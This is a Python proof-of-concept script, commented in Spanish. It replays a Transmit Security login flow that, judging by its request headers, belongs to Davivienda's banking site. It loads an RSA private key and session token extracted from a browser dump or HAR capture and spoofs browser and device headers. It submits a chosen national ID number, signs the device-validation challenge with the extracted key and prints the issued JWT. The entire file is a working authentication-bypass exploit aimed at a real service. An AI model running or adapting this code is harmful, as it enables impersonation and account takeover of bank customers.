"""
POC Fase 1 — reproduce el login Transmit Security reusando sessionToken + RSA
privkey extraidos del navegador donde se capturo `checkclient.har`.

Flujo:
  1. Carga keys (transmit_keys.json) y descubre privkey RSA + sessionToken.
  2. (Opcional) Fallback: si el dump no trae sessionToken, lo toma del HAR.
  3. POST /ido/api/v2/auth/anonymous_invoke con la cedula objetivo.
  4. Recibe device_challenge -> firma con RSA-PSS sobre el b64 ASCII.
  5. POST /ido/api/v2/auth/assert con la firma.
  6. Imprime JWT final + decode.

Uso:
    python src/poc_replay.py --cedula 79666962
    python src/poc_replay.py --cedula 1018xxxx --tipo CC
"""
from __future__ import annotations

import argparse
import base64
import json
import sys
import uuid
from pathlib import Path
from typing import Any

import httpx

sys.path.insert(0, str(Path(__file__).resolve().parent))

from crypto_utils import (  # noqa: E402
    device_key_id_from_spki_b64,
    jwk_to_private_key,
    jwt_decode_unverified,
    sign_device_challenge,
    spki_b64_from_public_key,
)

ROOT = Path(__file__).resolve().parent.parent
DEFAULT_KEYS = ROOT / "capture" / "transmit_keys.json"
DEFAULT_HAR = ROOT / "checkclient.har"

# Constantes del flujo capturado (visibles en URL/JWT del HAR)
CLIENT_ID = "R9KZiThZt0AndM3q-uN_B"
POLICY_REQUEST_ID = "login_transv"
ACTION_TYPE = "login"
APPLICATION_ID = "default_application"
LOCALE = "en-US"
TENANT_ID = "qvdv8g2zet3no7v40dg51"  # tomado del sessionToken decoded del HAR

BASE = "https://api.transmitsecurity.io"
INVOKE_URL = f"{BASE}/ido/api/v2/auth/anonymous_invoke"
ASSERT_URL = f"{BASE}/ido/api/v2/auth/assert"

HEADERS_BROWSER = {
    "accept": "*/*",
    "accept-language": "es-CO,es;q=0.9,en;q=0.8",
    "content-type": "application/json;charset=UTF-8",
    "origin": "https://apiauth.davivienda.com",
    "referer": "https://apiauth.davivienda.com/",
    "user-agent": (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/148.0.0.0 Safari/537.36"
    ),
}


# --------------------------------------------------------------------------- helpers


def _find_rsa_privkey_jwk(node: Any) -> dict[str, Any] | None:
    """Walks a dict/list dump from extract_idb.js looking for any RSA JWK with `d` field."""
    if isinstance(node, dict):
        if node.get("kty") == "RSA" and "d" in node and "n" in node:
            return node
        if "exportedJwk" in node and isinstance(node["exportedJwk"], dict):
            jwk = node["exportedJwk"]
            if jwk.get("kty") == "RSA" and "d" in jwk:
                return jwk
        for v in node.values():
            found = _find_rsa_privkey_jwk(v)
            if found:
                return found
    elif isinstance(node, list):
        for v in node:
            found = _find_rsa_privkey_jwk(v)
            if found:
                return found
    return None


def _find_session_token(node: Any) -> str | None:
    """Looks for a string that decodes as a JWT containing `keyIdentifier`."""
    if isinstance(node, str) and node.count(".") == 2 and len(node) > 50:
        try:
            dec = jwt_decode_unverified(node)
            if "keyIdentifier" in dec["payload"] or "publicKeyId" in dec["payload"]:
                return node
        except Exception:
            return None
    if isinstance(node, dict):
        for v in node.values():
            found = _find_session_token(v)
            if found:
                return found
    elif isinstance(node, list):
        for v in node:
            found = _find_session_token(v)
            if found:
                return found
    return None


def _session_token_from_har(har_path: Path) -> str:
    data = json.loads(har_path.read_text(encoding="utf-8"))
    for entry in data["log"]["entries"]:
        url = entry["request"]["url"]
        if "risk-collect/device/events" in url:
            body = json.loads(entry["response"]["content"]["text"])
            return body["sessionToken"]
    raise SystemExit("No risk-collect entry in HAR; cannot bootstrap sessionToken")


# --------------------------------------------------------------------------- flow


def run(cedula: str, tipo: str, keys_path: Path, har_path: Path, verbose: bool) -> None:
    if not keys_path.exists():
        print(f"[warn] {keys_path} no existe. Solo se podra usar el HAR como fallback.")
        dump: dict[str, Any] = {}
    else:
        dump = json.loads(keys_path.read_text(encoding="utf-8"))

    # ---- Locate private key ------------------------------------------------
    jwk = _find_rsa_privkey_jwk(dump)
    if jwk is None:
        raise SystemExit(
            "No se encontro una privkey RSA exportable en transmit_keys.json.\n"
            "Posibles causas:\n"
            "  - El SDK creo la clave con extractable:false (revisa notes del dump).\n"
            "  - El dump esta vacio (no se corrio el extractor todavia).\n"
            "Si es lo primero, hay que ir a Fase 3 (regenerar con Node.js + jsdom)."
        )
    priv = jwk_to_private_key(jwk)
    pub = priv.public_key()
    spki_b64 = spki_b64_from_public_key(pub)
    device_key_id = device_key_id_from_spki_b64(spki_b64)
    if verbose:
        print(f"[*] privkey cargada. device_key_id = {device_key_id}")

    # ---- Locate sessionToken ----------------------------------------------
    session_token = _find_session_token(dump)
    if session_token is None:
        print("[warn] sessionToken no encontrado en dump; cayendo al HAR.")
        session_token = _session_token_from_har(har_path)
    st_payload = jwt_decode_unverified(session_token)["payload"]
    if verbose:
        print(f"[*] sessionToken keyIdentifier = {st_payload.get('keyIdentifier')}")
        print(f"    tenantId   = {st_payload.get('tenantId')}")
        print(f"    clientId   = {st_payload.get('clientId')}")
        print(f"    exp        = {st_payload.get('exp')}")
    if st_payload.get("keyIdentifier") != device_key_id:
        raise SystemExit(
            "MISMATCH: el sessionToken esta atado a otra public key.\n"
            f"  sessionToken.keyIdentifier = {st_payload.get('keyIdentifier')}\n"
            f"  device_key_id(de privkey)  = {device_key_id}\n"
            "Necesitas el sessionToken cuyo keyIdentifier coincida con tu RSA, "
            "o regenerar sessionToken via /risk-collect (Fase 3)."
        )

    # ---- Build #20 anonymous_invoke ---------------------------------------
    username = f"{tipo}-{cedula}"  # patron 01-79666962 visto en HAR
    correlation_id = str(uuid.uuid4())
    xid = str(uuid.uuid4())
    xsess = str(uuid.uuid4())
    now_ms = _now_ms()

    invoke_body = {
        "data": {
            "collection_result": {"metadata": {"timestamp": now_ms}, "content": {}},
            "policy_request_id": POLICY_REQUEST_ID,
            "params": {
                "username": username,
                "sessionToken": session_token,
                "tenantId": TENANT_ID,
                "clientId": CLIENT_ID,
                "keyIdentifier": device_key_id,
                "publicKeyId": device_key_id,
                "iat": st_payload.get("iat"),
                "exp": st_payload.get("exp"),
                "actionType": ACTION_TYPE,
                "xid": xid,
                "xsess": xsess,
            },
        },
        "headers": [
            {"type": "correlation_id", "correlation_id": correlation_id},
            {
                "type": "device",
                "device": {
                    "device_key_id": device_key_id,
                    "device_public_key": spki_b64,
                    "device_type": "web",
                    "device_os": "win32",
                    "device_os_version": "148.0",
                    "device_manufacturer": "Google Inc.",
                    "device_model": "Win32",
                },
            },
            {"type": "drs_session_token", "drs_session_token": {"token": session_token}},
        ],
    }

    params = {"aid": APPLICATION_ID, "clientId": CLIENT_ID, "locale": LOCALE}
    with httpx.Client(timeout=30, headers=HEADERS_BROWSER) as cli:
        print(f"[#20] POST {INVOKE_URL}  username={username}")
        r1 = cli.post(INVOKE_URL, params=params, json=invoke_body)
        print(f"      <- {r1.status_code} {len(r1.content)} bytes")
        if verbose:
            print(_short(r1.text))
        r1.raise_for_status()
        d1 = r1.json()
        if d1.get("error_code") != 0:
            raise SystemExit(f"#20 error: {d1}")

        data = d1["data"]
        if not data.get("control_flow"):
            print("[!] Sin control_flow — quizas el server YA cerro el assertion.")
            print(json.dumps(d1, indent=2))
            return

        cf = data["control_flow"][0]
        if cf["type"] != "transmit_platform_device_validation":
            raise SystemExit(f"Tipo de challenge inesperado: {cf['type']}")
        device_challenge_b64 = cf["device_challenge"]
        assertion_id = cf["assertion_id"]
        fch = data["challenge"]

        ephemeral_uid = None
        device_id = None
        session_id = None
        for h in d1.get("headers", []):
            if h.get("type") == "ephemeral_uid":
                ephemeral_uid = h["uid"]
            elif h.get("type") == "device_id":
                device_id = h["device_id"]
            elif h.get("type") == "session_id":
                session_id = h["session_id"]

        print(f"[#20] OK. challenge={device_challenge_b64} fch={fch}")
        print(f"      ephemeral_uid={ephemeral_uid}  device_id={device_id}  session_id={session_id}")

        # ---- Build #22 assert -----------------------------------------------
        signature_b64 = sign_device_challenge(priv, device_challenge_b64)
        if verbose:
            print(f"[*] signature ({len(base64.b64decode(signature_b64))} bytes) = {signature_b64[:60]}...")

        assert_body = {
            "headers": [
                {"type": "uid", "uid": ephemeral_uid},
                {"type": "correlation_id", "correlation_id": correlation_id},
                {
                    "type": "device",
                    "device": {
                        "device_key_id": device_key_id,
                        "device_public_key": spki_b64,
                        "device_type": "web",
                        "device_os": "win32",
                        "device_os_version": "148.0",
                        "device_manufacturer": "Google Inc.",
                        "device_model": "Win32",
                    },
                },
            ],
            "data": {
                "assertion_id": assertion_id,
                "action": "transmit_platform_device_validation",
                "assert": "action",
                "input": {"device_challenge": device_challenge_b64},
                "fch": fch,
                "data": {
                    "ts:idosdk:device": {
                        "platform_device_id": device_key_id,
                        "signature": signature_b64,
                    }
                },
            },
        }

        assert_params = dict(params, did=device_id, sid=session_id)
        print(f"[#22] POST {ASSERT_URL}")
        r2 = cli.post(ASSERT_URL, params=assert_params, json=assert_body)
        print(f"      <- {r2.status_code} {len(r2.content)} bytes")
        if verbose:
            print(_short(r2.text))
        r2.raise_for_status()
        d2 = r2.json()
        if d2.get("error_code") != 0:
            raise SystemExit(f"#22 error: {d2}")

        token = d2["data"].get("token")
        if not token:
            print("[!] sin token en respuesta:")
            print(json.dumps(d2, indent=2))
            return

        print()
        print(f"==> JWT final ({len(token)} chars):")
        print(token)
        print()
        decoded = jwt_decode_unverified(token)
        print("==> JWT decoded payload:")
        print(json.dumps(decoded["payload"], indent=2))


def _now_ms() -> int:
    import time
    return int(time.time() * 1000)


def _short(txt: str, limit: int = 500) -> str:
    return txt if len(txt) <= limit else txt[:limit] + f"... ({len(txt)} bytes)"


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--cedula", required=True)
    ap.add_argument("--tipo", default="01", help="prefijo de tipo doc (01 = CC). Visto en HAR.")
    ap.add_argument("--keys", default=str(DEFAULT_KEYS), type=Path)
    ap.add_argument("--har", default=str(DEFAULT_HAR), type=Path)
    ap.add_argument("-v", "--verbose", action="store_true")
    args = ap.parse_args()
    run(args.cedula, args.tipo, args.keys, args.har, args.verbose)


if __name__ == "__main__":
    main()
